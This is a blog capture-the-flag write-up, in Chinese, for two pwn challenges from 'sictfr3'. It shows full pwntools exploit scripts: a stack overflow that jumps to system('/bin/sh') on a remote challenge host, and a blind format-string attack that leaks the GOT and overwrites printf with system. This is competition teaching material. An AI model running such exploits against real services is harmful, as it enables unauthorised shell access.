<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>sictfr3_pwn_wp | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  <meta name="description" content="pwn[签到]stack题目逻辑是这样的，其实就是找一个比 0x58 大很多，低一个字节小于 0x40的数，就能溢出了
char *run()
&amp;#123;
  char buf[76]; &amp;#x2F;&amp;#x2F; [rsp+0h] [rbp-50h] BYREF
  size_t nbytes; &amp;#x2F;&amp;#x2F; [rsp+4Ch] [rbp-4h]

  printf(&amp;quot;Give me the length: &amp;quot;);
  LODWORD(nbytes) &amp;#x3D; get_int();
  if ( (unsigned __int8)nbytes &amp;gt; 0x40u )
  &amp;#123;
    puts(&amp;quot;Too long!&amp;quot;);
    exit(1);
  &amp;#125;
  printf(&amp;quot;Give me your command: &amp;quot;);
  read(0, buf, (unsigned int)nbytes);
  return strdup(buf);
&amp;#125;

有一个 backdoor 函数，然后我看了一下没有 rdi的gadget
int __fastcall backdoor(const char *a1)
&amp;#123;
  if ( strncmp(a1, &amp;quot;give me flag&amp;quot;, 0xCuLL) )
    return puts(&amp;quot;Nope!&amp;quot;);
  puts(&amp;quot;You got!&amp;quot;);
  return system(a1);
&amp;#125;

但是在call system前，因为strdup了一次  rax寄存器是一个堆上的地址，内容和read进去的数据一模一样的，所以可以构造一个 &amp;#x2F;bin&amp;#x2F;sh\x00 …… 这样一个payload，在 mov rdi,rax的时候就会取到binsh的地址，最后syscall
.text:00000000004011F0 48 8B 45 F8                   mov     rax, [rbp+s1]
.text:00000000004011F4 48 89 C7                      mov     rdi, rax                        ; command
.text:00000000004011F7 E8 64 FE FF FF                call    _system
.text:00000000004011F7

exp
from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)

is_debug = 0
IP = &#34;yuanshen.life&#34;
PORT = 33074

elf = context.binary = ELF(&#39;./pwn&#39;)
libc = elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g = lambda x: gdb.attach(x)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x=None: p.recv() if x is None else p.recv(x)
rl = lambda: p.recvline()
ru = lambda x: p.recvuntil(x)
r_leak_libc_64 = lambda: u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))
r_leak_libc_32 = lambda: u32(p.recvuntil(b&#39;\xf7&#39;)[-4:])

p = connect()

# 313

backdoor = 0x4011F4

payload = b&#39;/bin/sh\x00&#39; +b&#39;a&#39; * (0x50)
payload += p64(backdoor)


sla(&#34;Give me the length: &#34;,&#34;313&#34;)
# g(p)
sa(&#34;Give me your command: &#34;,payload)

p.interactive()"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="sictfr3_pwn_wp"/>
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> sictfr3_pwn_wp</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="签到-stack"><a href="#签到-stack" class="headerlink" title="[签到]stack"></a>[签到]stack</h2><p>题目逻辑是这样的，其实就是找一个比 0x58 大很多，低一个字节小于 0x40的数，就能溢出了</p>
<pre class="line-numbers language-none"><code class="language-none">char *run()
&#123;
  char buf[76]; &#x2F;&#x2F; [rsp+0h] [rbp-50h] BYREF
  size_t nbytes; &#x2F;&#x2F; [rsp+4Ch] [rbp-4h]

  printf(&quot;Give me the length: &quot;);
  LODWORD(nbytes) &#x3D; get_int();
  if ( (unsigned __int8)nbytes &gt; 0x40u )
  &#123;
    puts(&quot;Too long!&quot;);
    exit(1);
  &#125;
  printf(&quot;Give me your command: &quot;);
  read(0, buf, (unsigned int)nbytes);
  return strdup(buf);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有一个 backdoor 函数，然后我看了一下没有 rdi的gadget</p>
<pre class="line-numbers language-none"><code class="language-none">int __fastcall backdoor(const char *a1)
&#123;
  if ( strncmp(a1, &quot;give me flag&quot;, 0xCuLL) )
    return puts(&quot;Nope!&quot;);
  puts(&quot;You got!&quot;);
  return system(a1);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是在call system前，因为strdup了一次  rax寄存器是一个堆上的地址，内容和read进去的数据一模一样的，所以可以构造一个 &#x2F;bin&#x2F;sh\x00 …… 这样一个payload，在 mov rdi,rax的时候就会取到binsh的地址，最后syscall</p>
<pre class="line-numbers language-none"><code class="language-none">.text:00000000004011F0 48 8B 45 F8                   mov     rax, [rbp+s1]
.text:00000000004011F4 48 89 C7                      mov     rdi, rax                        ; command
.text:00000000004011F7 E8 64 FE FF FF                call    _system
.text:00000000004011F7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">0</span>
IP <span class="token operator">=</span> <span class="token string">"yuanshen.life"</span>
PORT <span class="token operator">=</span> <span class="token number">33074</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 313</span>

backdoor <span class="token operator">=</span> <span class="token number">0x4011F4</span>

payload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">+</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>


sla<span class="token punctuation">(</span><span class="token string">"Give me the length: "</span><span class="token punctuation">,</span><span class="token string">"313"</span><span class="token punctuation">)</span>
<span class="token comment"># g(p)</span>
sa<span class="token punctuation">(</span><span class="token string">"Give me your command: "</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Easy-SI"><a href="#Easy-SI" class="headerlink" title="Easy_SI"></a>Easy_SI</h2><p>格式化字符串盲打，第一次做这种题，去学习了一下</p>
<p><a target="_blank" rel="noopener" href="https://wiki.mrskye.cn/Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#printf-plt">https://wiki.mrskye.cn/Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#printf-plt</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/196722#h2-6">https://www.anquanke.com/post/id/196722#h2-6</a></p>
<p>思路是找到elf的基地址后，爆破所有可读的段，找到got表的位置，可以通过libc中的printf 后三位 来判断got表中哪个是printf，然后把把printf_got 写成 system_got 最后输入binsh</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"yuanshen.life"</span>
PORT <span class="token operator">=</span> <span class="token number">33465</span>

libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">leak_stack_fmt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">b"%p"</span>

<span class="token keyword">def</span> <span class="token function">show_stack</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    fmtstr <span class="token operator">=</span> <span class="token string">b""</span>
    data_set <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        fmtstr <span class="token operator">+=</span> leak_stack_fmt<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'-'</span>

    sla<span class="token punctuation">(</span><span class="token string">"And now let's start the game!!!"</span><span class="token punctuation">,</span>fmtstr<span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data_set<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> -> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data_set<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">leak_addr_fmt</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">b"%7$saaaa"</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>

    fmtstr <span class="token operator">=</span> leak_addr_fmt<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"And now let's start the game!!!"</span><span class="token punctuation">,</span>fmtstr<span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        leak <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.6</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> leak
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
        <span class="token comment"># print(f"error: -> &#123;hex(addr)&#125;")</span>
        

<span class="token keyword">def</span> <span class="token function">leak_elf</span><span class="token punctuation">(</span>addr1<span class="token punctuation">,</span>addr2<span class="token punctuation">)</span><span class="token punctuation">:</span>

    data_set <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    addr_set <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    got_addr_set <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    got_content_set <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> 
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>addr1<span class="token punctuation">,</span>addr2<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> leak<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        <span class="token keyword">if</span> data<span class="token punctuation">:</span>
            addr_set<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            data_set<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data_set<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr_set<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> -> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data_set<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token string">b'\x7f'</span> <span class="token keyword">in</span> data_set<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>
            got_addr_set<span class="token punctuation">.</span>append<span class="token punctuation">(</span>addr_set<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
            got_content_set<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data_set<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> got_addr_set<span class="token punctuation">,</span>got_content_set


<span class="token comment"># show_stack(40)</span>
<span class="token comment">#start -> 0x4010d0</span>


<span class="token comment"># leak_elf(0x404000 - 0x30,0x404000 + 0x120)</span>

<span class="token comment"># 0x403ff0 -> b'\n\xc0md\xbc~\x7faaaa'</span>
<span class="token comment"># 0x403ff8 -> b'\naaaa'</span>
<span class="token comment"># 0x404000 -> b'\n >@aaaa'</span>
<span class="token comment"># 0x404008 -> b'\n\xe02\x88\xbc~\x7faaaa'</span>
<span class="token comment"># 0x404010 -> b'\n`\xdc\x85\xbc~\x7faaaa'</span>
<span class="token comment"># 0x404018 -> b'\nP\xdei\xbc~\x7faaaa'</span>
<span class="token comment"># 0x404020 -> b'\n@\x10@aaaa'</span>
<span class="token comment"># 0x404028 -> b'\n\xe0Oj\xbc~\x7faaaa'</span>
<span class="token comment"># 0x404030 -> b'\n\xf0\xd6g\xbc~\x7faaaa'</span>
<span class="token comment"># 0x404038 -> b'\n\xd0\x17s\xbc~\x7faaaa'</span>
<span class="token comment"># 0x404040 -> b'\naaaa'</span>
<span class="token comment"># 0x404048 -> b'\naaaa'</span>
<span class="token comment"># 0x404050 -> b'\naaaa'</span>
<span class="token comment"># 0x404058 -> b'\naaaa'</span>
<span class="token comment"># 0x404060 -> b'\n\x80\x87\x83\xbc~\x7faaaa'</span>
<span class="token comment"># 0x404068 -> b'\naaaa'</span>
<span class="token comment"># 0x404070 -> b'\n\xa0z\x83\xbc~\x7faaaa'</span>
<span class="token comment"># 0x404078 -> b'\naaaa'</span>
<span class="token comment"># 0x404080 -> b'\n\xa0\x86\x83\xbc~\x7faaaa'</span>
<span class="token comment"># 0x404088 -> b'\naaaa'</span>
<span class="token comment"># 0x404090 -> b'\naaaa'</span>

got_addr_set<span class="token punctuation">,</span>got_content_set <span class="token operator">=</span> leak_elf<span class="token punctuation">(</span><span class="token number">0x403ff0</span><span class="token punctuation">,</span><span class="token number">0x404088</span><span class="token punctuation">)</span>
got_content_set <span class="token operator">=</span> <span class="token punctuation">[</span>u64<span class="token punctuation">(</span>i<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> got_content_set<span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>got_addr_set<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>got_addr_set<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> -> </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>got_content_set<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 0x404018 -> 0x7ff74be0de50</span>
<span class="token comment"># 0x404028 -> 0x7ff74be14fe0</span>
<span class="token comment"># 0x404030 -> 0x7ff74bded6f0</span>
<span class="token comment"># 0x404038 -> 0x7ff74bea17d0</span>
<span class="token comment"># 0x404060 -> 0x7ff74bfa8780</span>
<span class="token comment"># 0x404070 -> 0x7ff74bfa7aa0</span>
<span class="token comment"># 0x404080 -> 0x7ff74bfa86a0</span>
<span class="token comment"># 0x606f0</span>
got_addr_set<span class="token punctuation">,</span>got_content_set <span class="token operator">=</span> leak_elf<span class="token punctuation">(</span><span class="token number">0x404030</span><span class="token punctuation">,</span><span class="token number">0x404038</span><span class="token punctuation">)</span>
got_content_set <span class="token operator">=</span> <span class="token punctuation">[</span>u64<span class="token punctuation">(</span>i<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> got_content_set<span class="token punctuation">]</span>

printf <span class="token operator">=</span> got_content_set<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

libc_base <span class="token operator">=</span> printf <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>

<span class="token comment"># print(hex(system))</span>

payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>got_addr_set<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>system<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>write_size<span class="token operator">=</span><span class="token string">'byte'</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>




